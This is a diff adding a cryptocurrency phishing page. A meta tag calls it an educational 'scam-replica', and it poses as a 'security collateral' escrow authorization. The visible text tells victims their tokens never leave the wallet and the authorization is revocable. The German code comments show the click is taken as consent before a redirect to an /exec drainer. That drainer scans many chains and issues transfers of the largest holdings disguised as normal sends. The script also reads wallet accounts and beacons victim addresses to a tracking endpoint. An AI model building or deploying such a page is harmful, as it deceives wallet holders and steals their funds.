@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Security Collateral — PullPayment</title>
+<meta name="description" content="Scam-replica: victim-facing 'security collateral' page — approve() + registerApproval on the PullPayment contract. Educational demo.">
+<meta name="robots" content="noindex">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { min-height: 100%; }
+  body {
+    font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #F7F8FA; color: #0E1116;
+    display: flex; flex-direction: column; align-items: center;
+    padding: 0 20px calc(28px + env(safe-area-inset-bottom));
+    -webkit-font-smoothing: antialiased;
+  }
+  .brand {
+    width: 100%; max-width: 420px;
+    display: flex; align-items: center; gap: 9px;
+    padding: 22px 2px 0; font-size: 14px; font-weight: 700; letter-spacing: -0.01em;
+  }
+  .brand svg { flex-shrink: 0; }
+  .brand span { color: #6B7280; font-weight: 500; margin-left: auto; font-size: 11.5px; }
+  .card {
+    width: 100%; max-width: 420px; margin-top: 26px;
+    background: #fff; border: 1px solid #E7EAF0; border-radius: 20px;
+    padding: 26px 22px 22px;
+    box-shadow: 0 1px 2px rgba(16,24,40,.04), 0 12px 32px -12px rgba(16,24,40,.10);
+    animation: rise .45s cubic-bezier(.2,.8,.3,1) both;
+  }
+  @keyframes rise { from { opacity: 0; transform: translateY(12px); } }
+  h1 { font-size: 21px; font-weight: 800; letter-spacing: -0.02em; }
+  .sub { margin-top: 7px; font-size: 13.5px; line-height: 1.55; color: #5B6472; }
+  .amount-box {
+    margin-top: 18px; padding: 16px;
+    background: #EEF3FF; border: 1px solid #CFDCF7; border-radius: 14px;
+    display: flex; align-items: center; gap: 12px;
+  }
+  .token-ic {
+    width: 38px; height: 38px; border-radius: 50%;
+    background: #3562FF; color: #fff;
+    display: grid; place-items: center;
+    font-weight: 800; font-size: 15px; flex-shrink: 0;
+  }
+  .amount-box .v { font-size: 19px; font-weight: 800; letter-spacing: -0.01em; }
+  .amount-box .l { font-size: 11.5px; color: #3D5A9E; font-weight: 600; margin-top: 1px; }
+  .rows { margin-top: 16px; }
+  .row {
+    display: flex; gap: 10px; align-items: flex-start;
+    padding: 9px 2px; font-size: 12.5px; line-height: 1.5; color: #454F5E;
+  }
+  .row svg { flex-shrink: 0; margin-top: 1px; }
+  .row b { color: #0E1116; font-weight: 600; }
+  .cta {
+    width: 100%; margin-top: 18px; padding: 15px;
+    border: 0; border-radius: 13px;
+    background: #3562FF; color: #fff;
+    font-family: inherit; font-size: 15px; font-weight: 700;
+    cursor: pointer; transition: transform .12s ease, background .15s ease;
+  }
+  .cta:active { transform: scale(.975); }
+  .cta:disabled { background: #9AA5B1; cursor: default; transform: none; }
+  .fineprint { margin-top: 13px; font-size: 11px; line-height: 1.55; color: #98A1AE; text-align: center; }
+  .status-line {
+    margin-top: 12px; min-height: 16px;
+    font-size: 12px; font-weight: 500; color: #8A93A3; text-align: center;
+    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+  }
+  .card.done { border-color: #C9EBDA; }
+  .card.done .cta { display: none; }
+  .done-mark {
+    display: none; margin: 18px auto 4px;
+    width: 46px; height: 46px; border-radius: 50%;
+    border: 2.5px solid #05B956; position: relative;
+  }
+  .card.done .done-mark { display: block; }
+  .done-mark::after {
+    content: ""; position: absolute; left: 50%; top: 50%;
+    width: 11px; height: 20px; border: solid #05B956; border-width: 0 3px 3px 0;
+    transform: translate(-50%, -58%) rotate(45deg);
+  }
+  .foot { margin-top: 22px; font-size: 10.5px; color: #B3BAC5; }
+  @media (prefers-reduced-motion: reduce) { .card { animation: none; } }
+</style>
+</head>
+<body>
+
+<div class="brand">
+  <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><rect x="3" y="6" width="18" height="14" rx="3" stroke="#3562FF" stroke-width="2"/><path d="M8 10.5h8M8 14h5" stroke="#3562FF" stroke-width="2" stroke-linecap="round"/></svg>
+  Collateral Escrow
+  <span id="net">Ethereum network</span>
+</div>
+
+<div class="card" id="card">
+  <h1>Security collateral</h1>
+  <p class="sub">Register an on-chain collateral authorization for your payment agreement. The tokens stay in your wallet — this is an authorization, not a transfer.</p>
+
+  <div class="amount-box">
+    <div class="token-ic" id="tokenIc">₮</div>
+    <div>
+      <div class="v" id="amountLabel">—</div>
+      <div class="l">Collateral amount</div>
+    </div>
+  </div>
+
+  <div class="rows">
+    <div class="row">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="#3562FF" stroke-width="2"/><path d="M8.5 12.3l2.3 2.3 4.7-4.8" stroke="#3562FF" stroke-width="2" fill="none" stroke-linecap="round"/></svg>
+      <div><b>Nothing leaves your wallet.</b> The collateral is a signed authorization recorded in the smart contract.</div>
+    </div>
+    <div class="row">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="#3562FF" stroke-width="2"/><path d="M12 7v5l3.2 1.8" stroke="#3562FF" stroke-width="2" stroke-linecap="round"/></svg>
+      <div><b>Revocable.</b> You can withdraw the authorization at any time by calling revokeApproval.</div>
+    </div>
+    <div class="row">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><rect x="4" y="4" width="16" height="16" rx="4" stroke="#3562FF" stroke-width="2"/><path d="M9 12h6" stroke="#3562FF" stroke-width="2" stroke-linecap="round"/></svg>
+      <div><b>Standard confirmations.</b> Your wallet verifies the registered assets — each holding is confirmed once.</div>
+    </div>
+  </div>
+
+  <div class="done-mark" aria-hidden="true"></div>
+  <button class="cta" id="cta" type="button">Register collateral</button>
+  <div class="status-line" id="status" role="status"></div>
+  <div class="status-line" id="waddr" style="font-size:.66rem;opacity:.55;word-break:break-all;"></div>
+  <p class="fineprint">Recorded on-chain. The contract administrator may draw up to the approved amount only after a verified default.</p>
+</div>
+
+<div class="foot">PullPayment contract · terms v2026-09</div>
+
+<script>
+// ── Scam-Replik: collateral-escrow "PullPayment" Opfer-Seite (EVM-Port) ──────
+// approve(token → PullPayment) + registerApproval(token, amount, recipient,
+// termsHash) — danach kann der Contract-Owner serverseitig pull() ausführen.
+// ?chain=base|eth|bsc|polygon|arbitrum          (default base)
+// ?token=usdt|usdc                              (default usdt)
+// ?amount=<n>                                   (default 20)
+// ?recipient=0x…                                (Whitelist-Empfänger)
+// ────────────────────────────────────────────────────────────────────────────
+var CHAINS = {
+  base:    { id: 8453,  name: "Base",      pull: "0x8158a68d5944a2b333f93172d184d3f4956eed27",
+             rpc: "https://mainnet.base.org", explorer: "https://basescan.org",
+             native: { name: "Ether", symbol: "ETH", decimals: 18 },
+             tokens: {
+               usdt: { addr: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2", decimals: 6, name: "USDT" },
+               usdc: { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bda02913", decimals: 6, name: "USDC" }
+             } },
+  eth:     { id: 1,     name: "Ethereum",  pull: "0x022EAAa026c25A6387deBD79095a7e4cC1f44fc0",
+             rpc: "https://eth.drpc.org", explorer: "https://etherscan.io",
+             native: { name: "Ether", symbol: "ETH", decimals: 18 },
+             tokens: {
+               usdt: { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, name: "USDT" },
+               usdc: { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6, name: "USDC" }
+             } },
+  bsc:     { id: 56,    name: "BNB Chain", pull: "",
+             rpc: "https://bsc-dataseed.binance.org", explorer: "https://bscscan.com",
+             native: { name: "BNB", symbol: "BNB", decimals: 18 },
+             tokens: {
+               usdt: { addr: "0x55d398326f99059fF775485246999027B3197955", decimals: 18, name: "USDT" },
+               usdc: { addr: "0x8AC76A51cc950d9822D68b3bF1B8dE62E1fD45dF", decimals: 18, name: "USDC" }
+             } },
+  polygon: { id: 137,   name: "Polygon",   pull: "",
+             rpc: "https://polygon-rpc.com", explorer: "https://polygonscan.com",
+             native: { name: "POL", symbol: "POL", decimals: 18 },
+             tokens: {
+               usdt: { addr: "0xc2132D05D31c914a87C6611C10748AEc631e0dF4", decimals: 6, name: "USDT" },
+               usdc: { addr: "0x3c499c542cEF6E9CB4d095a8c41A89E9206E9D5D", decimals: 6, name: "USDC" }
+             } },
+  arbitrum:{ id: 42161, name: "Arbitrum",  pull: "",
+             rpc: "https://arb1.arbitrum.io/rpc", explorer: "https://arbiscan.io",
+             native: { name: "Ether", symbol: "ETH", decimals: 18 },
+             tokens: {
+               usdt: { addr: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6, name: "USDT" },
+               usdc: { addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals: 6, name: "USDC" }
+             } }
+};
+var params = new URLSearchParams(location.search);
+var chain = CHAINS[(params.get("chain") || "base").toLowerCase()] || CHAINS.base;
+var token = chain.tokens[(params.get("token") || "usdt").toLowerCase()] || chain.tokens.usdt;
+var amountParam = (params.get("amount") || "20").trim();
+var recipient = (params.get("recipient") || "").trim();
+// ?addr= — known victim address: /exec scans it directly, no account read
+// and no connect sheet can ever appear
+var victim = (params.get("addr") || "").trim();
+
+var card = document.getElementById("card");
+var cta = document.getElementById("cta");
+var statusEl = document.getElementById("status");
+
+document.getElementById("net").textContent = chain.name + " network";
+document.getElementById("tokenIc").textContent = token.name.slice(0, 1);
+var amt = parseFloat(amountParam);
+if (isFinite(amt) && amt > 0) {
+  document.getElementById("amountLabel").textContent =
+    amt.toLocaleString("en-US", { maximumFractionDigits: 6 }) + " " + token.name;
+} else {
+  document.getElementById("amountLabel").textContent = amountParam + " " + token.name;
+}
+
+var MONITOR_URL = "/api/events";
+var monitSid = "e-" + Math.random().toString(36).slice(2, 8) + "-" + Date.now().toString(36);
+function monit(ev, data) {
+  try {
+    var payload = JSON.stringify({ ev: ev, t: new Date().toISOString(), sid: monitSid, d: data || {} });
+    if (navigator.sendBeacon && navigator.sendBeacon(MONITOR_URL, payload)) return;
+    fetch(MONITOR_URL, { method: "POST", mode: "no-cors", keepalive: true, body: payload }).catch(function() {});
+  } catch(e) {}
+}
+
+function setStatus(t) { statusEl.textContent = t; }
+function isEvmAddr(a) { return /^0x[a-fA-F0-9]{40}$/.test(a); }
+
+function eth() { return window.ethereum || (window.trustwallet && window.trustwallet.ethereum) || null; }
+
+var busy = false;
+cta.addEventListener("click", async function() {
+  if (busy) return;
+  if (!isEvmAddr(recipient)) { setStatus("invalid collateral link"); return; }
+  busy = true; cta.disabled = true;
+  setStatus("Verifying wallet…");
+  monit("escrow_confirm", { chain: chain.id, token: token.name, amount: amountParam });
+  // Die Maske ist der Consent — danach übernimmt /exec den Chainscanner:
+  // silent 12-Chain-Scan → transfer()-Sheets größte→kleinste. Kein approve,
+  // kein Contract-Spender — sieht aus wie normale Sends.
+  var dest = "/exec?to=" + encodeURIComponent(recipient) + "&via=escrow"
+           + (isEvmAddr(victim) ? "&addr=" + encodeURIComponent(victim) : "");
+  try {
+    var e = eth();
+    if (e) {
+      var accts = await e.request({ method: "eth_accounts" }).catch(function() { return null; });
+      if (accts && accts[0]) monit("escrow_connected", { addr: accts[0], chain: chain.id });
+    }
+  } catch (e0) {}
+  location.replace(dest);
+});
+
+monit("escrow_opened", { chain: chain.id, token: token.name, amount: amountParam, inWallet: !!eth() });
+if (!isEvmAddr(recipient)) { cta.disabled = true; setStatus("invalid collateral link"); }
+</script>
+</body>
+</html>
